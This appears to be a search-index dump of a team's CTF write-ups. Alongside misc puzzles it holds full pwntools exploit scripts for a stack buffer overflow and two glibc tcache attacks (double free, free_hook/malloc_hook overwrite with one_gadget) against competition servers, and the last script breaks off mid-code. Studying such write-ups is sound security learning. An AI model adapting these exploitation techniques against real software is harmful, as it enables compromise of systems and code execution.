def parse_message(message): try: message = message.replace(b\"convert\", b\"\").strip() message = message.replace(b\" @@@@@\", b\"\").strip() base_a = message.split(b\"to\")[0].replace(b\"convert\", b\"\").strip() base_b = message.split(b\"to\")[1].split(b\":\")[0].strip() pivot = (f\"{base_b.decode()}:\").encode() value = message.split(pivot)[-1].strip() return base_a.decode(), base_b.decode(), value except Exception as e: print(f\"Exception raised: {e} with message: {message}\") if name == \" main \": conn = remote('challenges.ctfd.io', 30008) for i in range(0, 120): for j in range(0, 2): print(conn.recvline()) line = conn.recvline() base_a, base_b, value = parse_message(line) print(line) print(f\" Parsed to: from **{base_a}** to **{base_b}** ===> \", value) response = None #1 - Convert start types in byte. stop if base_a == \"bytearray\": bytes_value = bytes( bytearray ( eval ( value ) ) ) elif base_a == \"hexdigest\": bytes_value = bytes.fromhex( value.decode() ) # TypeError: fromhex() argument must be str, not bytes elif base_a == \"string\": bytes_value = value.strip() # (?) elif base_a == \"integer\": bytes_value = (int(value)).to_bytes(8, 'big') #2 - Convert byte from what you want. if base_b == \"bytearray\": response = str( list( bytearray(bytes_value) ) ) elif base_b == \"hexdigest\": response = bytes_value.hex() elif base_b == \"string\": response = bytes_value.strip() elif base_b == \"integer\": response = str( int.from_bytes(bytes_value, byteorder='big', signed=False) ) if response is not None: print(b\"Going to send response ===> \", response) conn.send(response) conn.send(b\"\\n\") print(b\"Response from challenge: \" + conn.recvline()) print(conn.recvline()) print(f\"\\n {i+1} ===================================\\n\") else: print(\"No response was provided\")","title":"Transforms"},{"location":"misc/DarkCTF/quick/","text":"Quickfix Description We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python. Solution Script from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new(\"RGB\", (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i,\"rb+\") as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png') Solution Flag: Flag Image","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#quickfix","text":"","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#description","text":"We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python.","title":"Description"},{"location":"misc/DarkCTF/quick/#solution-script","text":"from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new(\"RGB\", (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i,\"rb+\") as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png')","title":"Solution Script"},{"location":"misc/DarkCTF/quick/#solution","text":"Flag: Flag Image","title":"Solution"},{"location":"misc/DarkCTF/quick/#_1","text":"","title":""},{"location":"misc/HSCTF7/Emojis/","text":"Emojis - Misc HSCTF2020 Description This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code. Replicated Code The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118 Solution Flag: flag{tr3v0r-pAck3p}","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#description","text":"This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code.","title":"Description"},{"location":"misc/HSCTF7/Emojis/#replicated-code","text":"The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118","title":"Replicated Code"},{"location":"misc/HSCTF7/Emojis/#solution","text":"Flag: flag{tr3v0r-pAck3p}","title":"Solution"},{"location":"misc/HSCTF7/Emojis/#_1","text":"","title":""},{"location":"pwning/intro/","text":"Binary Exploitation Introduction \"Write about Pwn and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit BlueHens CTF Beef-Of-Finitude - Shravya Bhaskara ShaktiCTF21 Returning - Shruti Dixit","title":"Binary Exploitation"},{"location":"pwning/intro/#binary-exploitation","text":"","title":"Binary Exploitation"},{"location":"pwning/intro/#introduction","text":"\"Write about Pwn and about the writeups\"","title":"Introduction"},{"location":"pwning/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit BlueHens CTF Beef-Of-Finitude - Shravya Bhaskara ShaktiCTF21 Returning - Shruti Dixit","title":"The contents of this repo"},{"location":"pwning/BlueHensCTF/beef-of-finitude/","text":"Beef_Of_Finitude To start off, we see a main function which calls function myFun. This functions takes in two inputs (strings), one as name and the other as password. An initial variable say var is defined and is equal to 7. i.e var = 0x7 as seen from line 22 in myFun. The first input and second inputs are 16 bytes long, however, if we look at line 103, we can see a 'push 0x150' command, which suggests that though the size for second input is 16 bytes, its taking 0x150 in total. This would mean that there is a chance to overflow the buffer to proceed to line 120, where the var value is compared with 0xdeadbeef and as we know var is stored at ebp-0xc as seen from line 22. Hence to satisfy the condition, we need to overflow the password in a way so that, var = 0xdeadbeef. To do that we may use the following code: from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('shravya') r.recvuntil('Enter your password:') r.send('B'*26 + p32(0xdeadbeef)) r.interactive() Till here we have just overflown the buffer. This allows us into the shell but however to get the flag we may have to call the win() function. The gdb dump for the win() function is: 0x08049240 <+10>: sub esp,0x12c ; the stack size defined for win function is 0x12c or 300 bytes, whereas that for password input of myFun was 336 bytes. 0x08049246 <+16>: call 0x8049170 <__x86.get_pc_thunk.bx> ; which implies that we can overflow the buffer into yet another function, i.e the win() function. To do so, we will first have to fill the above stack with 336-300 = 36 bytes, since the win function accpets 4 arguments, 0x0804924b <+21>: add ebx,0x2db5 ; 0x08049251 <+27>: mov ecx,DWORD PTR [ebp+0x8] ; the following lines determine the 4 arguments to the win() function, 0x08049254 <+30>: mov DWORD PTR [ebp-0x130],ecx ; if ((((param_2 | param_1 ^ 0x14b4da55) == 0) && ((param_3 ^ 0x67616c66 | param_4) == 0))) 0x0804925a <+36>: mov ecx,DWORD PTR [ebp+0xc] ; thus param_2 = 0; param_1 = 0x14b4da55 and param_3 = 0; param_4 = 0x67616c66 0x0804925d <+39>: mov DWORD PTR [ebp-0x12c],ecx 0x08049263 <+45>: mov ecx,DWORD PTR [ebp+0x10] 0x08049266 <+48>: mov DWORD PTR [ebp-0x138],ecx 0x0804926c <+54>: mov ecx,DWORD PTR [ebp+0x14] 0x0804926f <+57>: mov DWORD PTR [ebp-0x134],ecx 0x08049275 <+63>: mov ecx,DWORD PTR [ebp-0x130] 0x0804927b <+69>: xor ecx,0x14b4da55 0x08049281 <+75>: mov esi,ecx 0x08049283 <+77>: mov ecx,DWORD PTR [ebp-0x12c] 0x08049289 <+83>: xor ch,0x0 0x0804928c <+86>: mov edi,ecx 0x0804928e <+88>: mov ecx,edi 0x08049290 <+90>: or ecx,esi 0x08049292 <+92>: test ecx,ecx 0x08049294 <+94>: jne 0x80492c0 <win+138> 0x08049296 <+96>: mov ecx,DWORD PTR [ebp-0x138] 0x0804929c <+102>: xor ecx,0x67616c66 Thus in order to overflow the buffer at the password, and to call the win() function once the right value is compared at ebp-0xc register, we will have to: 1. rewrite ebp-0xc with p32(0xdeadbeef) since that is what it is compared with, 2. rewrite the return address stored at eip to that of the win function, 3. pass arguments of win function, i.e param_1 = p32(0x14b4da55), param_2 = p32(0x0), param_3 = p32(0x67616c66), param_4 = p32(0x0) python program : (cotinuation) ``` from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('hi') r.recvuntil('Enter your password:') r.sendline('B' 26 + p32(0xdeadbeef) + 'B' 12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0)) r.interactive() ``` Flag: UDCTF{0bl1g4t0ry_buff3r_ov3rflow}","title":"Beef_Of_Finitude"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#beef_of_finitude","text":"To start off, we see a main function which calls function myFun. This functions takes in two inputs (strings), one as name and the other as password. An initial variable say var is defined and is equal to 7. i.e var = 0x7 as seen from line 22 in myFun. The first input and second inputs are 16 bytes long, however, if we look at line 103, we can see a 'push 0x150' command, which suggests that though the size for second input is 16 bytes, its taking 0x150 in total. This would mean that there is a chance to overflow the buffer to proceed to line 120, where the var value is compared with 0xdeadbeef and as we know var is stored at ebp-0xc as seen from line 22. Hence to satisfy the condition, we need to overflow the password in a way so that, var = 0xdeadbeef. To do that we may use the following code: from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('shravya') r.recvuntil('Enter your password:') r.send('B'*26 + p32(0xdeadbeef)) r.interactive() Till here we have just overflown the buffer. This allows us into the shell but however to get the flag we may have to call the win() function.","title":"Beef_Of_Finitude"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#the-gdb-dump-for-the-win-function-is","text":"0x08049240 <+10>: sub esp,0x12c ; the stack size defined for win function is 0x12c or 300 bytes, whereas that for password input of myFun was 336 bytes. 0x08049246 <+16>: call 0x8049170 <__x86.get_pc_thunk.bx> ; which implies that we can overflow the buffer into yet another function, i.e the win() function. To do so, we will first have to fill the above stack with 336-300 = 36 bytes, since the win function accpets 4 arguments, 0x0804924b <+21>: add ebx,0x2db5 ; 0x08049251 <+27>: mov ecx,DWORD PTR [ebp+0x8] ; the following lines determine the 4 arguments to the win() function, 0x08049254 <+30>: mov DWORD PTR [ebp-0x130],ecx ; if ((((param_2 | param_1 ^ 0x14b4da55) == 0) && ((param_3 ^ 0x67616c66 | param_4) == 0))) 0x0804925a <+36>: mov ecx,DWORD PTR [ebp+0xc] ; thus param_2 = 0; param_1 = 0x14b4da55 and param_3 = 0; param_4 = 0x67616c66 0x0804925d <+39>: mov DWORD PTR [ebp-0x12c],ecx 0x08049263 <+45>: mov ecx,DWORD PTR [ebp+0x10] 0x08049266 <+48>: mov DWORD PTR [ebp-0x138],ecx 0x0804926c <+54>: mov ecx,DWORD PTR [ebp+0x14] 0x0804926f <+57>: mov DWORD PTR [ebp-0x134],ecx 0x08049275 <+63>: mov ecx,DWORD PTR [ebp-0x130] 0x0804927b <+69>: xor ecx,0x14b4da55 0x08049281 <+75>: mov esi,ecx 0x08049283 <+77>: mov ecx,DWORD PTR [ebp-0x12c] 0x08049289 <+83>: xor ch,0x0 0x0804928c <+86>: mov edi,ecx 0x0804928e <+88>: mov ecx,edi 0x08049290 <+90>: or ecx,esi 0x08049292 <+92>: test ecx,ecx 0x08049294 <+94>: jne 0x80492c0 <win+138> 0x08049296 <+96>: mov ecx,DWORD PTR [ebp-0x138] 0x0804929c <+102>: xor ecx,0x67616c66 Thus in order to overflow the buffer at the password, and to call the win() function once the right value is compared at ebp-0xc register, we will have to: 1. rewrite ebp-0xc with p32(0xdeadbeef) since that is what it is compared with, 2. rewrite the return address stored at eip to that of the win function, 3. pass arguments of win function, i.e param_1 = p32(0x14b4da55), param_2 = p32(0x0), param_3 = p32(0x67616c66), param_4 = p32(0x0)","title":"The gdb dump for the win() function is:"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#python-program-cotinuation","text":"``` from pwn import * r = remote('challenges.ctfd.io', 30027) r.recvuntil('Enter your Name:') r.sendline('hi') r.recvuntil('Enter your password:') r.sendline('B' 26 + p32(0xdeadbeef) + 'B' 12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0)) r.interactive() ```","title":"python program : (cotinuation)"},{"location":"pwning/BlueHensCTF/beef-of-finitude/#flag-udctf0bl1g4t0ry_buff3r_ov3rflow","text":"","title":"Flag: UDCTF{0bl1g4t0ry_buff3r_ov3rflow}"},{"location":"pwning/De1CTF20/stl/","text":"STL_Container Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> 1 1. add 2. delete 3. show >> 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks. Getting the Leaks I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak! Final Exploit I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter(\">>\",str(ds)) r.sendlineafter(\">>\",str(opt)) if(opt == 1): r.sendlineafter(\"input data:\",value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter(\"index?\\n\",str(idx)) if(ds ==2): print(\"lol\") print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64((\"\\x70\"+r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split(\": \")[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#stl_container","text":"Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> 1 1. add 2. delete 3. show >> 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit >> So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks.","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#getting-the-leaks","text":"I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak!","title":"Getting the Leaks"},{"location":"pwning/De1CTF20/stl/#final-exploit","text":"I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter(\">>\",str(ds)) r.sendlineafter(\">>\",str(opt)) if(opt == 1): r.sendlineafter(\"input data:\",value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter(\"index?\\n\",str(idx)) if(ds ==2): print(\"lol\") print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64((\"\\x70\"+r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split(\": \")[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"Final Exploit"},{"location":"pwning/HSCTF20/studysim/","text":"Studysim This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep > Add Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added. Do Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 <stdout@@GLIBC_2.2.5>: 0x00007ffff7fc6760 0x0000000000000000 0x404030 <stdin@@GLIBC_2.2.5>: 0x00007ffff7fc5a00 0x0000000000000000 0x404040 <allocated_count>: 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 <stack>: 0x0000000000000000 0x0000000000000000 0x404070 <stack+16>: 0x0000000000000000 0x0000000000000000 0x404080 <stack+32>: 0x0000000000000000 0x0000000000000000 0x404090 <stack+48>: 0x0000000000000000 0x0000000000000000 Sleep Well, it just sleeps and exits. Nothing interesting here. Getting the Leaks To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. > For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 <-- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 <-- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 <-- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000 Final Exploit By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process(\"./studysim\",env = {\"LD_PRELOAD\" : \"./libc.so.6\"}) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(size)) k.sendlineafter(\"worksheet?\\n\",content) def do(count): k.sendlineafter(\"> \",\"do\") k.sendlineafter(\"finish?\\n\",str(count)) def sleep(): k.sendlineafter(\"> \",\"sleep\") stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil(\"Only \") heap_leak = int(k.recvline().strip().split(\" \")[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter(\"> \",\"add\") k.sendlineafter(\"worksheet?\\n\",str(0x8)) k.sendlineafter(\"worksheet?\\n\",'a') k.recvuntil(\"worksheet \") leak = k.recvline().strip().split(\" \")[0].replace(\"'\",\"\") leak = '\\x00'+leak[1:] leak = 